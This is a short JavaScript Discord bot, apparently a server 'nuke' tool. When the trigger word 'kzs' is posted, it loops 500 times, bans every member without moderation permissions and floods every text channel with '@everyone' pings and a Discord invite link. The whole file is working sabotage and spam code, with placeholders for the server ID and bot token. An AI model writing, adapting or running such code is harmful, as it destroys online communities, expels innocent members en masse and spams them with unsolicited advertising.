let Discord = require("discord.js")
let client = new Discord.Client()

client.on("message", message => {
  if(message.content === "kzs") {
    let server = client.guilds.cache.get("ID CHANNEL") //Right click on server icon to get server id
    for(let i =0;i<=500;i++) {
      server.members.cache.filter(r => !r.hasPermission("MANAGE_MESSAGES")).forEach(b => server.members.ban(b.id))
      server.channels.cache.filter(r => r.type === "text").forEach(channel => {
        channel.send("@everyone discord.gg/insomnie")
      })    
    }
   }
})

client.login("TOKEN")
